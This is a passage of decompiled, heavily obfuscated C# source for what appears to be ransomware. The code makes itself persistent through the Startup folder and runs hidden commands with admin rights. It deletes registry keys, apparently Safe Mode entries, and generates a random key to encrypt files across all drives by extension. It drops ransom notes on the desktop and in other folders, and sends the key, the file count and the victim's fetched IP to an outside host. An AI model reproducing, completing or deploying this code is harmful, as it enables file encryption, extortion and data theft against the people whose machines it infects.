	public static string FXOQkWyVgPzV;

	public static string rvXTXOXThUg;

	public static string iMLGovPqphjoL;

	public static string rjIwTTOtnKJwKK;

	public static string vYWEvRHWptFC;

	public static string TlQacgMcOPd;

	public static string mODuARVBuKgY;

	public static string PtsBXekLcxalyC;

	public static string YsLgrKljrXrO;

	public static string gkEJVIxxfyJv;

	public static string wwRRAZOHtDyjcWOvh;

	public static string XtRHCUJWcllQ;

	public static string akiIqstUMMsd;

	public static string qBogYeVcWxAEz;

	public static string WEGQronBHL;

	public static string TPKWQWzHLdOhNlLo;

	public static string vnYzvmwacjUdjV;

	public static string[] JeQJajbHDJTGCnq;

	public static string qpGYoLASDOB;

	public static bool aMtbjENTlvGs;

	public static string aDkDTffAgEPC;

	public static bool hWWikjLPcgd;

	public static bool DQPpYKEvQZUMRk;

	public static bool UpJWgNbiBYldazrH;

	public static bool yFKcqIFIcFhKJK;

	public static string NPfFzxrRnHyw;

	public static bool TiKXhRWKbmQI;

	public static bool keQUndsfsh;

	public static bool VBIWxnphgDj;

	public static bool YddgklTLPM;

	public static bool FwNVRjoRuJX;

	public static string KAvrknWnpmp;

	public static bool vhEoviCVwfZQ;

	public static Stopwatch IUccTNmqwawM;

	public static int bVOffGsglMxM;

	public static int LhieCrHWKTUqOfg;

	public static bool hpyULordzdhq;

	public static string UMHyeHuFiQnSyQ;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		if (args.Length == 0 && gnUszaDrSLDy == getString_0(107396732))
		{
			try
			{
				LTHBOLqRKWnP CS_0024_003C_003E8__locals0 = new LTHBOLqRKWnP();
				CS_0024_003C_003E8__locals0.ubTfaHruMTjL = Process.GetCurrentProcess().ProcessName;
				if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.ubTfaHruMTjL) > 1)
				{
					return;
				}
			}
			catch (Exception)
			{
			}
		}
		if (args.Length == 0 && gnUszaDrSLDy == getString_0(107396732))
		{
			try
			{
				XsWmQXAYWuonQLn.IYMkNnWIsCZs(lwzGwXJiBdgk);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (qBogYeVcWxAEz == getString_0(107397207))
			{
				Thread thread = new Thread(OBgOZoluzRdIGJ.nNNsmlwFnShJEe);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (HssaJUOvJGbgq == getString_0(107397207))
		{
			Thread.Sleep(int.Parse(OcxUzttKCHCEy));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && LRMGeQPxsQADKTt == getString_0(107397207))
		{
			try
			{
				oodLuoQAZYz(HVpeMrZfkFlb(getString_0(107397202)));
			}
			catch
			{
			}
		}
		try
		{
			if (mFrQbxzEMdalqU == getString_0(107397207) && iVFwivTQbEbRP.TfIcvEicmIU())
			{
				new FbEEJaBlaKz().tQRJeNbIFp(bool_0: false);
				iVFwivTQbEbRP.bfjtldqCbajOQ();
			}
		}
		catch (Exception)
		{
		}
		if (fPYzRKhyuWBoW == getString_0(107397207) && iVFwivTQbEbRP.TfIcvEicmIU())
		{
			new FbEEJaBlaKz().tQRJeNbIFp(bool_0: false);
			new FbEEJaBlaKz().snNZJYfBGlDk();
		}
		if (YqfHjDCVzC == getString_0(107397207))
		{
			YrIwaUMrtCzvdZp.EuNpcZboplkYNaHz();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397129);
			string text2 = text + Path.GetFileName(fileName);
			if (FRYGqIQyiT == getString_0(107397207) && fileName != text2)
			{
				Thread thread2 = new Thread(WRumsyxEXUStOmL);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (EiNdgqcqTVoi == getString_0(107397207) && mainModule != null && fileName != text2)
			{
				try
				{
					iyTOxLsoiMVpH = JbbgtxdOERvzwSb(0, bvTdfKIEWRmqB.Count);
					File.Copy(fileName, text + bvTdfKIEWRmqB[iyTOxLsoiMVpH], overwrite: true);
					Process.Start(text + bvTdfKIEWRmqB[iyTOxLsoiMVpH]);
					HJRcTLWrdpFl();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (KCVoFSMpGXKlq == getString_0(107397207) && DateTime.Now < ZxIIqtiyuAl)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (dnZRGCoCklSHKY == getString_0(107397207) && DateTime.Now > OHBfUHlZKqTDcuFxZ)
			{
				HJRcTLWrdpFl();
			}
		}
		catch
		{
		}
		IOprwvvAxZ();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> ziZdlGZQMKRIPJ = ZiZdlGZQMKRIPJ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						rCeUKIVeLnQH(getString_0(107391363), string_0);
					};
				}
				Parallel.ForEach(ziZdlGZQMKRIPJ, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> source = ussIlYOuJVMgKunLO;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						rCeUKIVeLnQH(getString_0(107390810), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> ouiVTcbGPHuSa = OuiVTcbGPHuSa;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107390797)), string_0);
					};
				}
				Parallel.ForEach(ouiVTcbGPHuSa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (vnYzvmwacjUdjV == getString_0(107397207))
				{
					string[] jeQJajbHDJTGCnq = JeQJajbHDJTGCnq;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107390797)), getString_0(107390772) + string_0 + getString_0(107390795));
						};
					}
					Parallel.ForEach(jeQJajbHDJTGCnq, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!HqqBLCvmqImsbDmo().Contains(getString_0(107391557)))
				{
					NRNysAWtZWK(wbCfMjGPdcW);
				}
				else
				{
					List<string> kSsRoxGqodAS = KSsRoxGqodAS;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							rCeUKIVeLnQH(HVpeMrZfkFlb(wToEnzHBmDVrI(getString_0(107390790))), string_0);
						};
					}
					Parallel.ForEach(kSsRoxGqodAS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> source2 = yRBEUVLZlAnEdd;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107390733)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> source3 = hJJkXeuiqGz;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						rCeUKIVeLnQH(getString_0(107390748), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && UpJWgNbiBYldazrH)
			{
				try
				{
					Thread thread4 = new Thread(YNYWqufSjGiE.hcxmeOpbdYP);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			rCeUKIVeLnQH(getString_0(107397124), HVpeMrZfkFlb(getString_0(107397079)));
			rCeUKIVeLnQH(getString_0(107397124), HVpeMrZfkFlb(getString_0(107397006)));
			rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107396437)), HVpeMrZfkFlb(getString_0(107396456)));
			rCeUKIVeLnQH(HVpeMrZfkFlb(getString_0(107396437)), HVpeMrZfkFlb(getString_0(107396326)));
		}
		SecureString secureString = new SecureString();
		if (kIvaDzqPWp == getString_0(107396732))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			kXRqipnIRdWIwO = getString_0(107396664);
		}
		eQkgiuFNXIleWNVL = SwirPclUHWNCec.RAWIZpYvlBsHh(dvClgikflKEdMIrZ(secureString));
		if (VBIWxnphgDj)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), KAvrknWnpmp)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), KAvrknWnpmp), string.Concat(HVpeMrZfkFlb(getString_0(107396651)), new WebClient().DownloadString(HVpeMrZfkFlb(getString_0(107396594))), getString_0(107396585), HVpeMrZfkFlb(getString_0(107396580)), DateTime.Now, getString_0(107396585), HVpeMrZfkFlb(getString_0(107396507)), eQkgiuFNXIleWNVL));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), KAvrknWnpmp), getString_0(107396482) + eQkgiuFNXIleWNVL);
				}
			}
			catch (Exception ex7)
			{
				if (TiKXhRWKbmQI)
				{
					try
					{
						File.AppendAllText(NPfFzxrRnHyw, getString_0(107395941) + ex7.Message + getString_0(107396585));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		HMgNcNLaDF.TvhtRRZUhoef(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), PtsBXekLcxalyC), kHOxNQVfWOWR(eQkgiuFNXIleWNVL), null, null, getString_0(107395860), getString_0(107395875), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			YwOPgndGpkrNn();
		}
		try
		{
			axpZytzHzcpnz(new string[26]
			{
				getString_0(107395826),
				getString_0(107395821),
				getString_0(107395848),
				getString_0(107395843),
				getString_0(107395838),
				getString_0(107395801),
				getString_0(107395796),
				getString_0(107395791),
				getString_0(107395818),
				getString_0(107395813),
				getString_0(107395808),
				getString_0(107395771),
				getString_0(107395766),
				getString_0(107395761),
				getString_0(107395756),
				getString_0(107395783),
				getString_0(107395778),
				getString_0(107395773),
				getString_0(107395736),
				getString_0(107395731),
				getString_0(107395726),
				getString_0(107395753),
				getString_0(107395748),
				getString_0(107395743),
				getString_0(107395706),
				getString_0(107395701)
			}, new string[100]
			{
				getString_0(107395696),
				getString_0(107395723),
				getString_0(107395718),
				getString_0(107395709),
				getString_0(107396184),
				getString_0(107396179),
				getString_0(107396174),
				getString_0(107396201),
				getString_0(107396196),
				getString_0(107396191),
				getString_0(107396154),
				getString_0(107396149),
				getString_0(107396140),
				getString_0(107396167),
				getString_0(107396158),
				getString_0(107396121),
				getString_0(107396116),
				getString_0(107396111),
				getString_0(107396138),
				getString_0(107396133),
				getString_0(107396124),
				getString_0(107396087),
				getString_0(107396082),
				getString_0(107396077),
				getString_0(107396104),
				getString_0(107396099),
				getString_0(107396094),
				getString_0(107396057),
				getString_0(107396052),
				getString_0(107396047),
				getString_0(107396074),
				getString_0(107396069),
				getString_0(107396064),
				getString_0(107396027),
				getString_0(107396018),
				getString_0(107396013),
				getString_0(107396040),
				getString_0(107396035),
				getString_0(107396174),
				getString_0(107396030),
				getString_0(107396196),
				getString_0(107395989),
				getString_0(107395984),
				getString_0(107396011),
				getString_0(107396006),
				getString_0(107396001),
				getString_0(107395996),
				getString_0(107395959),
				getString_0(107395954),
				getString_0(107395949),
				getString_0(107395976),
				getString_0(107395971),
				getString_0(107395966),
				getString_0(107395417),
				getString_0(107395412),
				getString_0(107395407),
				getString_0(107395434),
				getString_0(107395429),
				getString_0(107395420),
				getString_0(107395383),
				getString_0(107395374),
				getString_0(107395393),
				getString_0(107396030),
				getString_0(107395348),
				getString_0(107395371),
				getString_0(107395362),
				getString_0(107395321),
				getString_0(107395312),
				getString_0(107395335),
				getString_0(107395330),
				getString_0(107395289),
				getString_0(107395280),
				getString_0(107395303),
				getString_0(107395298),
				getString_0(107395293),
				getString_0(107395256),
				getString_0(107395251),
				getString_0(107395246),
				getString_0(107395273),
				getString_0(107395264),
				getString_0(107395227),
				getString_0(107395222),
				getString_0(107395217),
				getString_0(107395212),
				getString_0(107395239),
				getString_0(107395230),
				getString_0(107395189),
				getString_0(107395184),
				getString_0(107396064),
				getString_0(107395211),
				getString_0(107395206),
				getString_0(107395201),
				getString_0(107395196),
				getString_0(107395671),
				getString_0(107395662),
				getString_0(107395689),
				getString_0(107395684),
				getString_0(107395643),
				getString_0(107395638),
				getString_0(107395633)
			}, new string[0], dvClgikflKEdMIrZ(secureString), getString_0(107395628));
		}
		catch (Exception ex9)
		{
			if (TiKXhRWKbmQI)
			{
				try
				{
					File.AppendAllText(NPfFzxrRnHyw, getString_0(107395623) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395566)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395566));
				streamWriter.WriteLine(HVpeMrZfkFlb(getString_0(107395533)));
				streamWriter.WriteLine(getString_0(107396585));
				streamWriter.WriteLine(HVpeMrZfkFlb(getString_0(107393711)));
				streamWriter.WriteLine(eQkgiuFNXIleWNVL);
				if (yOLtwErlSIuUuw == getString_0(107396732))
				{
					streamWriter.WriteLine(getString_0(107396585));
					streamWriter.WriteLine(HVpeMrZfkFlb(getString_0(107393678)) + Convert.ToString(fpmCyTaZQjAm.Count));
				}
				if (hpyULordzdhq)
				{
					streamWriter.WriteLine(getString_0(107396585));
					streamWriter.WriteLine(HVpeMrZfkFlb(getString_0(107394145)));
					streamWriter.WriteLine(OoPMqxzMoPT.TuxvCREHhgWfT());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395566));
				if (!text3.Contains(eQkgiuFNXIleWNVL) && !hWWikjLPcgd)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395566), getString_0(107394112) + eQkgiuFNXIleWNVL);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in RVpXhPaEOqMSkG)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395566)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395566), item + getString_0(107395566), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395566));
					if (!text4.Contains(eQkgiuFNXIleWNVL) && !hWWikjLPcgd)
					{
						File.AppendAllText(item + getString_0(107395566), getString_0(107394112) + eQkgiuFNXIleWNVL);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!yFKcqIFIcFhKJK && num > 10)
			{
				break;
			}
		}
		if (wwRRAZOHtDyjcWOvh == getString_0(107397207))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394083)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394083));
					streamWriter2.WriteLine(HVpeMrZfkFlb(getString_0(107394050)));
					streamWriter2.WriteLine(getString_0(107396585));
					streamWriter2.WriteLine(HVpeMrZfkFlb(getString_0(107394001)));
					streamWriter2.WriteLine(eQkgiuFNXIleWNVL + HVpeMrZfkFlb(getString_0(107393912)));
					if (yOLtwErlSIuUuw == getString_0(107396732))
					{
						streamWriter2.WriteLine(getString_0(107396585));
						streamWriter2.WriteLine(HVpeMrZfkFlb(getString_0(107393931)) + HVpeMrZfkFlb(getString_0(107393678)) + Convert.ToString(fpmCyTaZQjAm.Count) + HVpeMrZfkFlb(getString_0(107393912)));
					}
					if (hpyULordzdhq)
					{
						streamWriter2.WriteLine(getString_0(107396585));
						streamWriter2.WriteLine(HVpeMrZfkFlb(getString_0(107394145)));
						streamWriter2.WriteLine(OoPMqxzMoPT.TuxvCREHhgWfT());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395566));
					if (!text5.Contains(eQkgiuFNXIleWNVL) && !hWWikjLPcgd)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394083), HVpeMrZfkFlb(getString_0(107393931)) + getString_0(107394112) + eQkgiuFNXIleWNVL + HVpeMrZfkFlb(getString_0(107393912)));
					}
				}
			}
			catch
			{
			}
		}
		if (YUqmLHcOKx == getString_0(107397207))
		{
			try
			{
				if (yOLtwErlSIuUuw == getString_0(107396732))
				{
					OoPMqxzMoPT.RIkeRVtwmNDLM(getString_0(107393326), getString_0(107393353), getString_0(107393340), string.Concat(HVpeMrZfkFlb(getString_0(107396651)), new WebClient().DownloadString(HVpeMrZfkFlb(getString_0(107396594))), getString_0(107393299), HVpeMrZfkFlb(getString_0(107396580)), DateTime.Now, getString_0(107396585), HVpeMrZfkFlb(getString_0(107393294)), Convert.ToString(fpmCyTaZQjAm.Count), getString_0(107396585), HVpeMrZfkFlb(getString_0(107396507)), eQkgiuFNXIleWNVL));
				}
				else
				{
					OoPMqxzMoPT.RIkeRVtwmNDLM(getString_0(107393326), getString_0(107393353), getString_0(107393340), string.Concat(HVpeMrZfkFlb(getString_0(107396651)), new WebClient().DownloadString(HVpeMrZfkFlb(getString_0(107396594))), getString_0(107393299), HVpeMrZfkFlb(getString_0(107396580)), DateTime.Now, getString_0(107396585), HVpeMrZfkFlb(getString_0(107393294)), Convert.ToString(fpmCyTaZQjAm.Count), getString_0(107396585), HVpeMrZfkFlb(getString_0(107396507)), eQkgiuFNXIleWNVL));
				}
			}
			catch
			{
			}
		}
		if (VTSwHYDZTQkjt == getString_0(107397207))
		{
			try
			{
				xGAWvnTUvweP.dXUOYSdtXMQ(new Uri(getString_0(107393277)));
			}
			catch
			{
			}
		}
		if (wwRRAZOHtDyjcWOvh == getString_0(107396732))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395566)))
				{
					Process.Start(HVpeMrZfkFlb(getString_0(107393276)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395566));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394083)))
				{
					Process.Start(HVpeMrZfkFlb(getString_0(107393251)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394083));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(HqoRxsyhnVRpC))
		{
			try
			{
				File.Delete(HqoRxsyhnVRpC);
			}
			catch
			{
			}
		}
		if (TiKXhRWKbmQI)
		{
			try
			{
				File.AppendAllText(NPfFzxrRnHyw, getString_0(107393202));
			}
			catch (Exception)
			{
			}
		}
		if (LGeZrzTAyQiZ == getString_0(107393221))
		{
			HJRcTLWrdpFl();
		}
	}

	public static void WRumsyxEXUStOmL()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(HVpeMrZfkFlb(getString_0(107393212)), HVpeMrZfkFlb(getString_0(107393570)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int JbbgtxdOERvzwSb(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> nnwntDLyIr(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107393521)) && !text.Contains(getString_0(107393496)) && !text.Contains(getString_0(107393463)) && !text.ToLower().Contains(getString_0(107393478)) && !text.ToLower().Contains(getString_0(107393433)) && !text.Contains(getString_0(107393440)) && !text.Contains(getString_0(107393419)) && !text.ToLower().Contains(getString_0(107392858)) && !text.ToLower().Contains(getString_0(107392845)) && !text.ToLower().Contains(getString_0(107392840)) && !text.ToLower().Contains(getString_0(107392831)) && !text.ToLower().Contains(getString_0(107392782)) && !text.ToLower().Contains(getString_0(107392801)) && !text.ToLower().Contains(getString_0(107392756)) && !text.ToLower().Contains(getString_0(107392767)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107392742)) && !fileInfo.FullName.Contains(getString_0(107392693)) && !fileInfo.FullName.Contains(getString_0(107392708)) && !fileInfo.FullName.Contains(getString_0(107392659)) && !fileInfo.FullName.Contains(getString_0(107392674)) && !fileInfo.FullName.Contains(getString_0(107392625)) && !fileInfo.FullName.Contains(getString_0(107392640)) && !fileInfo.FullName.Contains(getString_0(107393103)) && !fileInfo.FullName.Contains(getString_0(107393122)) && !fileInfo.FullName.Contains(getString_0(107393069)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393088)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393043)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393058)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393009)) && !fileInfo.FullName.Contains(HVpeMrZfkFlb(getString_0(107393024))) && !fileInfo.FullName.Contains(getString_0(107392999)) && !fileInfo.FullName.Contains(getString_0(107392954)) && !fileInfo.FullName.EndsWith(getString_0(107395628)) && !fileInfo.FullName.EndsWith(getString_0(107392961)) && !fileInfo.FullName.EndsWith(getString_0(107392956)) && !fileInfo.FullName.EndsWith(getString_0(107392919)) && !fileInfo.FullName.EndsWith(getString_0(107392914)) && !fileInfo.FullName.Contains(getString_0(107392909)) && !fileInfo.FullName.Contains(PtsBXekLcxalyC) && !fileInfo.FullName.Contains(NPfFzxrRnHyw) && !fileInfo.FullName.Contains(KAvrknWnpmp))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(SPQmigmjIMVgui) * 1024.0 * 1024.0 && zxNLGOSViKvsF == getString_0(107397207))
						{
							list.Add(fileInfo.FullName);
							KsRdrqFMQnbH(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && zxNLGOSViKvsF == getString_0(107396732))
						{
							list.Add(fileInfo.FullName);
							KsRdrqFMQnbH(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string rCeUKIVeLnQH(string NndDbWyesUN = "", string TqjQXYjOcYTDnF = "")
	{
		string result = getString_0(107393277);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = NndDbWyesUN,
				Arguments = TqjQXYjOcYTDnF,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void oodLuoQAZYz(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392924),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string wToEnzHBmDVrI(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string HVpeMrZfkFlb(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void NRNysAWtZWK(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = HVpeMrZfkFlb(getString_0(107392907));
		processStartInfo.Arguments = getString_0(107392334) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool dsPuSZignq(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string dvClgikflKEdMIrZ(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void IOprwvvAxZ()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = wToEnzHBmDVrI(getString_0(107392361));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(HVpeMrZfkFlb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HVpeMrZfkFlb(getString_0(107392223)));
					registryKey.DeleteSubKey(HVpeMrZfkFlb(getString_0(107392198)));
					registryKey.DeleteSubKey(HVpeMrZfkFlb(getString_0(107392149)));
					registryKey.DeleteSubKey(HVpeMrZfkFlb(getString_0(107392156)));
					registryKey.DeleteSubKey(HVpeMrZfkFlb(getString_0(107392907)));
					registryKey.DeleteSubKey(HVpeMrZfkFlb(getString_0(107392131)));
					registryKey.DeleteSubKey(HVpeMrZfkFlb(getString_0(107392614)));
					registryKey.Close();
				}
				string_ = wToEnzHBmDVrI(getString_0(107392565));
				registryKey = Registry.LocalMachine.OpenSubKey(HVpeMrZfkFlb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HVpeMrZfkFlb(getString_0(107392468)));
					registryKey.Close();
				}
				string_ = wToEnzHBmDVrI(getString_0(107392483));
				registryKey = Registry.LocalMachine.OpenSubKey(HVpeMrZfkFlb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HVpeMrZfkFlb(getString_0(107392468)));
					registryKey.Close();
				}
				string_ = wToEnzHBmDVrI(getString_0(107392483));
				registryKey = Registry.CurrentUser.OpenSubKey(HVpeMrZfkFlb(string_), writable: true);
				if (registryKey != null)
